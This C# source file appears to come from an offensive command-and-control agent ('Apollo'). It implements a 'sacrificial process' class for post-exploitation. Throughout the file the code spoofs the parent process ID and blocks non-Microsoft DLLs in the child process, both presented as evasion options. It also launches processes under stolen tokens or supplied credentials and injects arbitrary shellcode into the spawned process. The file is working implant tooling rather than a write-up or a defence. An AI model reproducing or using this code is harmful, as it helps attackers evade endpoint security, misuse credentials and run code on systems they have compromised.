//#define SERVER2012_COMPATIBLE

using ApolloInterop.Classes.Api;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.ApolloStructs;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static ApolloInterop.Enums.Win32;
using static ApolloInterop.Structs.Win32;
using AI = ApolloInterop.Classes.Core;

namespace Process
{
    public class SacrificialProcess : AI.Process
    {
        [Flags]
        public enum LogonFlags
        {
            NONE = 0x00000000,
            LOGON_WITH_PROFILE = 0x00000001,
            LOGON_NETCREDENTIALS_ONLY = 0x00000002
        }
        private const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
        private const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
        private const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

        private IntPtr _hParentProc = IntPtr.Zero;
        private ProcessInformation _processInfo = new ProcessInformation();
        private StartupInfo _startupInfo = new StartupInfo();
        private StartupInfoEx _startupInfoEx = new StartupInfoEx();
        private CreateProcessFlags _processFlags = CreateProcessFlags.CREATE_NEW_CONSOLE | CreateProcessFlags.CREATE_UNICODE_ENVIRONMENT;
        private SecurityAttributes _securityAttributes = new SecurityAttributes();
        private readonly AutoResetEvent _exited = new AutoResetEvent(false);

        private TextReader _standardOutput;
        private TextReader _standardError;
        private TextWriter _standardInput;

        private CancellationTokenSource _cts = new CancellationTokenSource();

        private SafeFileHandle hReadOut, hWriteOut, hReadErr, hWriteErr, hReadIn, hWriteIn, hDupWriteOut = new SafeFileHandle(IntPtr.Zero, true), hDupWriteErr = new SafeFileHandle(IntPtr.Zero, true);
        private IntPtr _unmanagedEnv;

        #region Delegate Typedefs
        #region ADVAPI32
        private delegate bool LogonUser(
            String lpszUserName,
            String lpszDomain,
            String lpszPassword,
            LogonType dwLogonType,
            LogonProvider dwLogonProvider,
            out IntPtr phToken);
        private delegate bool InitializeSecurityDescriptor(out SecurityDescriptor sd, uint dwRevision);
        private delegate bool SetSecurityDescriptorDacl(ref SecurityDescriptor sd, bool daclPresent, IntPtr dacl, bool daclDefaulted);
        private delegate bool CreateProcessAsUser
        (
            IntPtr hToken,
            String lpApplicationName,
            String lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            Boolean bInheritHandles,
            CreateProcessFlags dwCreationFlags,
            IntPtr lpEnvironment,
            String lpCurrentDirectory,
            ref StartupInfoEx lpStartupInfo,
            out ProcessInformation lpProcessInformation
        );
        private delegate bool CreateProcessWithLogonW(
            [MarshalAs(UnmanagedType.LPWStr)]String lpUsername,
            [MarshalAs(UnmanagedType.LPWStr)]String lpDomain,
            [MarshalAs(UnmanagedType.LPWStr)]String lpPassword,
            LogonFlags dwLogonFlags,
            [MarshalAs(UnmanagedType.LPWStr)]String lpApplicationName,
            [MarshalAs(UnmanagedType.LPWStr)]String lpCommandLine,
            CreateProcessFlags dwCreationFlags,
            IntPtr lpEnvironment,
            [MarshalAs(UnmanagedType.LPWStr)]String lpCurrentDirectory,
            [In] ref StartupInfoEx lpStartupInfo,
            out ProcessInformation lpProcessInformation);
        private delegate bool CreateProcessWithTokenW(
            IntPtr hToken,
            LogonFlags dwLogonFlags,
            [MarshalAs(UnmanagedType.LPWStr)]String lpApplicationName,
            [MarshalAs(UnmanagedType.LPWStr)]String lpCommandLine,
            CreateProcessFlags dwCreationFlags,
            IntPtr lpEnvironment,
            [MarshalAs(UnmanagedType.LPWStr)]String lpCurrentDirectory,
            [In] ref StartupInfoEx lpStartupInfo,
            out ProcessInformation lpProcessInformation);
        #endregion
        #region KERNEL32
#if SERVER2012_COMPATIBLE
        private delegate IntPtr GetModuleHandleA(
            [MarshalAs(UnmanagedType.LPStr)]string lpModuleName);

        private delegate IntPtr GetProcAddress(
            IntPtr hModule,
            [MarshalAs(UnmanagedType.LPStr)] string lpProcName);
#endif
        private delegate bool CreatePipe(out SafeFileHandle phReadPipe, out SafeFileHandle phWritePipe, SecurityAttributes lpPipeAttributes, uint nSize);
        private delegate bool SetHandleInformation(SafeFileHandle hObject, int dwMask, uint dwFlags);
        private delegate IntPtr OpenProcess(
            ProcessAccessFlags dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private delegate bool InitializeProcThreadAttributeList(
            [In] IntPtr lpAttributeList,
            [In] int dwAttributeCount,
            [In] int dwFlags,
            [In][Out] ref IntPtr lpSize);
        private delegate bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList,
            uint dwFlags,
            IntPtr Attribute,
            IntPtr lpValue,
            IntPtr cbSize,
            IntPtr lpPreviousValue,
            IntPtr lpReturnSize);
        private delegate bool DeleteProcThreadAttributeList(
            IntPtr lpAttributeList
        );
        private delegate bool DuplicateHandle(
            IntPtr hSourceProcessHandle,
            SafeFileHandle hSourceHandle,
            IntPtr hTargetProcessHandle,
            ref SafeFileHandle lpTargetHandle,
            uint dwDesiredAccess,
            bool bInheritHandle,
            DuplicateOptions dwOptions
        );
        private delegate bool CreateProcessA(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            CreateProcessFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref StartupInfoEx lpStartupInfo,
            out ProcessInformation lpProcessInformation);
        private delegate UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilli);
        private delegate bool GetExitCodeProcess(
            IntPtr hProcess,
            out int lpExitCode);
        private delegate void CloseHandle(IntPtr hHandle);
        #endregion
        #region USERENV
        // Userenv.dll
        private delegate bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
        private delegate bool DestroyEnvironmentBlock(IntPtr lpEnvironment);
        #endregion
#if SERVER2012_COMPATIBLE
        private GetModuleHandleA _pGetModuleHandleA;
        private GetProcAddress _pGetProcAddress;
#endif
        private CreateProcessAsUser _pCreateProcessAsUser;
        private CloseHandle _pCloseHandle;
        private InitializeSecurityDescriptor _pInitializeSecurityDescriptor;
        private SetSecurityDescriptorDacl _pSetSecurityDescriptorDacl;
        private CreatePipe _pCreatePipe;
        private SetHandleInformation _pSetHandleInformation;
        private OpenProcess _pOpenProcess;
        private InitializeProcThreadAttributeList _pInitializeProcThreadAttributeList = null;
        private UpdateProcThreadAttribute _pUpdateProcThreadAttribute;
        private DeleteProcThreadAttributeList _pDeleteProcThreadAttributeList;
        private DuplicateHandle _pDuplicateHandle;
        private CreateEnvironmentBlock _pCreateEnvironmentBlock;
        private DestroyEnvironmentBlock _pDestroyEnvironmentBlock;
        private CreateProcessA _pCreateProcessA;
        private WaitForSingleObject _pWaitForSingleObject;
        private GetExitCodeProcess _pGetExitCodeProcess;
        private LogonUser _pLogonUser;
        private CreateProcessWithLogonW _pCreateProcessWithLogonW;
        private CreateProcessWithTokenW _pCreateProcessWithTokenW;
        #endregion

        public SacrificialProcess(
            IAgent agent,
            string lpApplication,
            string lpArguments = null,
            bool startSuspended = false) : base(agent, lpApplication, lpArguments, startSuspended)
        {
            _pInitializeSecurityDescriptor = _agent.GetApi().GetLibraryFunction<InitializeSecurityDescriptor>(Library.ADVAPI32, "InitializeSecurityDescriptor");
            _pSetSecurityDescriptorDacl = _agent.GetApi().GetLibraryFunction<SetSecurityDescriptorDacl>(Library.ADVAPI32, "SetSecurityDescriptorDacl");
            _pLogonUser = _agent.GetApi().GetLibraryFunction<LogonUser>(Library.ADVAPI32, "LogonUserW");
            _pCreateProcessAsUser = _agent.GetApi().GetLibraryFunction<CreateProcessAsUser>(Library.ADVAPI32, "CreateProcessAsUserA");
            _pCreateProcessWithLogonW = _agent.GetApi().GetLibraryFunction<CreateProcessWithLogonW>(Library.ADVAPI32, "CreateProcessWithLogonW");
            _pCreateProcessWithTokenW = _agent.GetApi().GetLibraryFunction<CreateProcessWithTokenW>(Library.ADVAPI32, "CreateProcessWithTokenW");

            #if SERVER2012_COMPATIBLE
            _pGetModuleHandleA = _agent.GetApi().GetLibraryFunction<GetModuleHandleA>(Library.KERNEL32, "GetModuleHandleA");
            _pGetProcAddress = _agent.GetApi().GetLibraryFunction<GetProcAddress>(Library.KERNEL32, "GetProcAddress");

            IntPtr hKernel32 = _pGetModuleHandleA("kernel32.dll");
            IntPtr pInitializeProcThreadAttributeList =
                _pGetProcAddress(hKernel32, "InitializeProcThreadAttributeList");
            IntPtr pSetHandleInfo = _pGetProcAddress(hKernel32, "SetHandleInformation");
            IntPtr pUpdateProcThreadAttribute = _pGetProcAddress(hKernel32, "UpdateProcThreadAttribute");

            IntPtr pDeleteProcThreadAttributeList = _pGetProcAddress(hKernel32, "DeleteProcThreadAttributeList");


            _pInitializeProcThreadAttributeList =
                (InitializeProcThreadAttributeList)Marshal.GetDelegateForFunctionPointer(pInitializeProcThreadAttributeList,
                    typeof(InitializeProcThreadAttributeList));

            _pSetHandleInformation =
                (SetHandleInformation)Marshal.GetDelegateForFunctionPointer(pSetHandleInfo,
                    typeof(SetHandleInformation));
            
            _pUpdateProcThreadAttribute = (UpdateProcThreadAttribute)Marshal.GetDelegateForFunctionPointer(pUpdateProcThreadAttribute, typeof(UpdateProcThreadAttribute));
            _pDeleteProcThreadAttributeList = (DeleteProcThreadAttributeList)Marshal.GetDelegateForFunctionPointer(pDeleteProcThreadAttributeList, typeof(DeleteProcThreadAttributeList));
            #else
            _pSetHandleInformation = _agent.GetApi().GetLibraryFunction<SetHandleInformation>(Library.KERNEL32, "SetHandleInformation");
            _pInitializeProcThreadAttributeList = _agent.GetApi().GetLibraryFunction<InitializeProcThreadAttributeList>(Library.KERNEL32, "InitializeProcThreadAttributeList");
            _pUpdateProcThreadAttribute = _agent.GetApi().GetLibraryFunction<UpdateProcThreadAttribute>(Library.KERNEL32, "UpdateProcThreadAttribute");
            _pDeleteProcThreadAttributeList = _agent.GetApi().GetLibraryFunction<DeleteProcThreadAttributeList>(Library.KERNEL32, "DeleteProcThreadAttributeList");
            #endif

            _pCreateProcessA = _agent.GetApi().GetLibraryFunction<CreateProcessA>(Library.KERNEL32, "CreateProcessA");
            _pCreatePipe = _agent.GetApi().GetLibraryFunction<CreatePipe>(Library.KERNEL32, "CreatePipe");
            _pOpenProcess = _agent.GetApi().GetLibraryFunction<OpenProcess>(Library.KERNEL32, "OpenProcess");
            _pDuplicateHandle = _agent.GetApi().GetLibraryFunction<DuplicateHandle>(Library.KERNEL32, "DuplicateHandle");
            _pWaitForSingleObject = _agent.GetApi().GetLibraryFunction<WaitForSingleObject>(Library.KERNEL32, "WaitForSingleObject");
            _pGetExitCodeProcess = _agent.GetApi().GetLibraryFunction<GetExitCodeProcess>(Library.KERNEL32, "GetExitCodeProcess");
            _pCloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");

            _pCreateEnvironmentBlock = _agent.GetApi().GetLibraryFunction<CreateEnvironmentBlock>(Library.USERENV, "CreateEnvironmentBlock");
            _pDestroyEnvironmentBlock = _agent.GetApi().GetLibraryFunction<DestroyEnvironmentBlock>(Library.USERENV, "DestroyEnvironmentBlock");

            Exit += SacrificialProcess_Exit;
        }

        ~SacrificialProcess()
        {
            if (_startupInfoEx.lpAttributeList != IntPtr.Zero)
            {
                _pDeleteProcThreadAttributeList(_startupInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(_startupInfoEx.lpAttributeList);
            }

            if (_unmanagedEnv != IntPtr.Zero)
            {
                _pDestroyEnvironmentBlock(_unmanagedEnv);   
            }

            if (Handle != IntPtr.Zero)
            {
                _pCloseHandle(Handle);
            }

            if (_hParentProc != IntPtr.Zero)
            {
                _pCloseHandle(_hParentProc);
            }
        }

        private void SacrificialProcess_Exit(object sender, EventArgs e)
        {
            HasExited = true;
            int dwExit = 0;
            if (!_pGetExitCodeProcess(Handle, out dwExit))
            {
                ExitCode = 0;
            }
            else
            {
                ExitCode = dwExit;
            }
            try
            {
                System.Diagnostics.Process.GetProcessById((int)PID).Kill();
            } catch { }
            _exited.Set();
        }

        bool InitializeStartupEnvironment(IntPtr hToken)
        {
            bool bRet = false;
            bRet = InitializeProcessOutputPipes();

            if (!_pCreateEnvironmentBlock(out _unmanagedEnv, hToken, false))
            {
                _unmanagedEnv = IntPtr.Zero;
            }

            if (_startSuspended)
                _processFlags |= CreateProcessFlags.CREATE_SUSPENDED;

            // Create process
            _startupInfo.cb = Marshal.SizeOf(_startupInfoEx);
            _startupInfo.dwFlags = STARTF.STARTF_USESTDHANDLES | STARTF.STARTF_USESHOWWINDOW;
            // Wonder if this interferes with stdout?
            _startupInfo.wShowWindow = 0;
            ApplicationStartupInfo evasionArgs = GetSafeStartupArgs();

            if (_hParentProc != IntPtr.Zero)
            {
                IntPtr lpVal = Marshal.AllocHGlobal(IntPtr.Size);
                IntPtr lpSize = IntPtr.Zero;

                Marshal.WriteIntPtr(lpVal, _hParentProc);
                int dwAttributeCount = evasionArgs.BlockDLLs ? 2 : 1;
                
                var result1 = _pInitializeProcThreadAttributeList(IntPtr.Zero, dwAttributeCount, 0, ref lpSize);
                _startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                if (bRet = _pInitializeProcThreadAttributeList(_startupInfoEx.lpAttributeList, dwAttributeCount, 0, ref lpSize))
                {

                    // BlockDLLs
                    if (evasionArgs.BlockDLLs)
                    {
                        bRet = EnableBlockDLLs();
                    }

                    if (bRet = _pUpdateProcThreadAttribute(
                    _startupInfoEx.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpVal,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero))
                    {
                        try
                        {
                            bRet = _pDuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
                                hWriteOut,
                                _hParentProc,
                                ref hDupWriteOut,
                                0,
                                true,
                                DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
                            bRet = _pDuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
                                hWriteErr,
                                _hParentProc,
                                ref hDupWriteErr,
                                0,
                                true,
                                DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
                        }
                        catch (Exception ex)
                        {
                            try
                            {
                                using (_agent.GetIdentityManager().GetOriginal().Impersonate())
                                {
                                    bRet = _pDuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
                                        hWriteOut,
                                        _hParentProc,
                                        ref hDupWriteOut,
                                        0,
                                        true,
                                        DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
                                    bRet = _pDuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
                                        hWriteErr,
                                        _hParentProc,
                                        ref hDupWriteErr,
                                        0,
                                        true,
                                        DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
                                }
                            }
                            catch (Exception ex2)
                            {
                                bRet = false;
                            }
                        }
                        if (bRet)
                        {
                            _startupInfo.hStdOutput = hDupWriteOut;
                            _startupInfo.hStdError = hDupWriteErr;
                            _startupInfo.hStdInput = hReadIn;
                            _startupInfoEx.StartupInfo = _startupInfo;
                            bRet = true;
                        }
                    }
                    else
                    {
                        bRet = false;
                    }
                }
                else
                {
                    bRet = false;
                }
                if (!bRet)
                {
                    Marshal.FreeHGlobal(lpVal);
                }
            }
            else
            {
                bRet = false;
            }

            return bRet;
        }

        private bool EnableBlockDLLs()
        {
            bool bRet;
            var lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);

            Marshal.WriteInt64(
                lpMitigationPolicy,
                PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
                );

            bRet = _pUpdateProcThreadAttribute(
                _startupInfoEx.lpAttributeList,
                0,
                (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                lpMitigationPolicy,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero
                );
            return bRet;
        }

        private ApplicationStartupInfo GetSafeStartupArgs()
        {
            var evasionArgs = _agent.GetProcessManager().GetStartupInfo();
            
            // bad things happen if you're medium integrity and do ppid spoofing while under the effects of make_token
            if (_agent.GetIdentityManager().GetOriginal().Name != _agent.GetIdentityManager().GetCurrentPrimaryIdentity().Name)
            {
                evasionArgs.ParentProcessId = System.Diagnostics.Process.GetCurrentProcess().Id;
            }
            // I changed this to safe handle instead of intptr. Maybe bad???
            _hParentProc = _pOpenProcess(ProcessAccessFlags.MAXIMUM_ALLOWED, false, evasionArgs.ParentProcessId);

            if (_hParentProc == IntPtr.Zero)
            {
                using (_agent.GetIdentityManager().GetOriginal().Impersonate())
                    _hParentProc = _pOpenProcess(ProcessAccessFlags.MAXIMUM_ALLOWED, false, evasionArgs.ParentProcessId);
            }

            return evasionArgs;
        }

        private bool InitializeProcessOutputPipes()
        {
            bool bRet;
            _securityAttributes.bInheritHandle = true;
            bRet = _pInitializeSecurityDescriptor(out SecurityDescriptor sd, 1);
            bRet = _pSetSecurityDescriptorDacl(ref sd, true, IntPtr.Zero, false);
            IntPtr pSd = Marshal.AllocHGlobal(Marshal.SizeOf(sd));
            Marshal.StructureToPtr(sd, pSd, false);
            _securityAttributes.lpSecurityDescriptor = pSd;
            bRet = _pCreatePipe(out hReadOut, out hWriteOut, _securityAttributes, 0);
            if (!bRet)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            bRet = _pCreatePipe(out hReadErr, out hWriteErr, _securityAttributes, 0);
            if (!bRet)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            bRet = _pCreatePipe(out hReadIn, out hWriteIn, _securityAttributes, 0);
            if (!bRet)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            bRet = _pSetHandleInformation(hReadOut, 1, 0);
            if (!bRet)
                throw new Win32Exception(Marshal.GetLastWin32Error());
            return bRet;
        }

        public override bool Inject(byte[] code, string arguments = "")
        {
            bool bRet = false;
            if (Handle == IntPtr.Zero)
            {
                return bRet;
            }
            if (HasExited)
            {
                return bRet;
            }
            try
            {
                var technique = _agent.GetInjectionManager().CreateInstance(code, (int)PID);
                bRet = technique.Inject(arguments);
            }
            catch (Exception ex)
            {
                bRet = false;
            }
            return bRet;
        }

        public override bool Start()
        {
            bool bRet = false;
            
            if (_agent.GetIdentityManager().IsOriginalIdentity())
            {
                bRet = InitializeStartupEnvironment(_agent.GetIdentityManager().GetCurrentPrimaryIdentity().Token);
                if (bRet)
                {
                    bRet = _pCreateProcessA(
                        null,
                        CommandLine,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        true,
                        _processFlags | CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT,
                        _unmanagedEnv,
                        null,
                        ref _startupInfoEx,
                        out _processInfo);   
                }
            }
            else
            {
                return StartWithCredentials(_agent.GetIdentityManager().GetCurrentPrimaryIdentity().Token);
            }
            if (!bRet)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            PostStartupInitialize();

            if (PID != 0)
                WaitForExitAsync();

            return bRet;
        }



        private void PostStartupInitialize()
        {
            Handle = _processInfo.hProcess;
            PID = (uint)_processInfo.dwProcessId;
            _standardOutput = new StreamReader(new FileStream(hReadOut, FileAccess.Read), Console.OutputEncoding);
            _standardError = new StreamReader(new FileStream(hReadErr, FileAccess.Read), Console.OutputEncoding);
            _standardInput = new StreamWriter(new FileStream(hWriteIn, FileAccess.Write), Console.InputEncoding);
        }

        private void WaitForExitAsync()
        {
            Task.Factory.StartNew(() =>
            {
                var stdOutTask = GetStdOutAsync();
                var stdErrTask = GetStdErrAsync();
                var waitExitForever = new Task(() =>
                {
                    _pWaitForSingleObject(Handle, 0xFFFFFFFF);
                });
                stdOutTask.Start();
                stdErrTask.Start();
                waitExitForever.Start();
                try
                {
                    waitExitForever.Wait(_cts.Token);
                } catch (OperationCanceledException) {
                    
                } finally
                {
                    OnExit(this, null);
                }
                Task.WaitAll(new Task[]
                {
                    stdOutTask,
                    stdErrTask
                });
            });
        }

        private IEnumerable<string> ReadStream(TextReader stream)
        {
            string output = "";
            int szBuffer = 4096;
            int bytesRead = 0;
            char[] tmp;
            bool needsBreak = false;

            while (!_cts.IsCancellationRequested && !HasExited)
            {
                char[] buf = new char[szBuffer];
                try
                {
                    bytesRead = stream.Read(buf, 0, szBuffer);
                }
                catch { bytesRead = 0; }

                if (bytesRead > 0)
                {
                    tmp = new char[bytesRead];
                    Array.Copy(buf, tmp, bytesRead);
                    output = new string(tmp);
                    yield return output;
                }
            }
            output = "";
            try
            {
                output = stream.ReadToEnd();
            }
            catch { }
            if (!string.IsNullOrEmpty(output))
            {
                yield return output;
            }

        }

        private Task GetStdOutAsync()
        {
            return new Task(() =>
            {
                foreach (string s in ReadStream(_standardOutput))
                {
                    StdOut += s;
                    OnOutputDataReceived(this, new StringDataEventArgs(s));
                }
            });
        }

        private Task GetStdErrAsync()
        {
            return new Task(() =>
            {
                foreach (string s in ReadStream(_standardError))
                {
                    StdErr += s;
                    OnErrorDataRecieved(this, new StringDataEventArgs(s));
                }
            });
        }

        public override bool StartWithCredentials(ApolloLogonInformation logonInfo)
        {
            bool bRet = false;
            IntPtr hToken = IntPtr.Zero;

            bRet = _pLogonUser(
                logonInfo.Username,
                logonInfo.Domain,
                logonInfo.Password,
                LogonType.LOGON32_LOGON_NEW_CREDENTIALS,
                LogonProvider.LOGON32_PROVIDER_WINNT50,
                out hToken);
            if (!bRet)
            {
                return bRet;
            }
            else
            {
                Exit += (object sender, EventArgs e) =>
                {
                    _pCloseHandle(hToken);
                };
                return StartWithCredentials(hToken);
            }
        }

        public override bool StartWithCredentials(IntPtr hToken)
        {
            int dwError;
            var bRet = false;

            bRet = InitializeStartupEnvironment(hToken);

            if (!bRet)
            {
                return bRet;
            }
            else
            {
                bRet = _pCreateProcessAsUser(
                    hToken,
                    null,
                    CommandLine,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    true,
                    _processFlags | CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT,
                    _unmanagedEnv,
                    null,
                    ref _startupInfoEx,
                    out _processInfo
                );
                dwError = Marshal.GetLastWin32Error();
                if (!bRet && (dwError == 1314)) // ERROR_PRIVILEGE_NOT_HELD or FILE_NOT_FOUND
                {
                    bRet = _pCreateProcessWithTokenW(
                        hToken,
                        LogonFlags.LOGON_NETCREDENTIALS_ONLY, // LOGON_NET_CREDENTIALS_ONLY
                        null,
                        CommandLine,
                        _processFlags,
                        _unmanagedEnv,
                        null,
                        ref _startupInfoEx,
                        out _processInfo);

                    dwError = Marshal.GetLastWin32Error();

                    if (!bRet && (dwError == 1314))
                    {
                        if (_agent.GetIdentityManager().GetCurrentLogonInformation(out ApolloLogonInformation cred))
                        {
                            bRet = _pCreateProcessWithLogonW(
                                cred.Username,
                                cred.Domain,
                                cred.Password,
                                LogonFlags.LOGON_NETCREDENTIALS_ONLY,
                                null,
                                CommandLine,
                                _processFlags,
                                _unmanagedEnv,
                                null,
                                ref _startupInfoEx,
                                out _processInfo);
                            dwError = Marshal.GetLastWin32Error();
                        }
                    }
                }

                if (!bRet)
                    throw new Win32Exception(dwError);

                PostStartupInitialize();
                if (PID != 0)
                    WaitForExitAsync();
                return bRet;
            }
        }

        public override void Kill()
        {
            _cts.Cancel();
            _exited.WaitOne();
        }

        public override void WaitForExit()
        {
            _exited.WaitOne();
        }

        public override void WaitForExit(int milliseconds)
        {
            _exited.WaitOne(milliseconds);
        }
    }
}
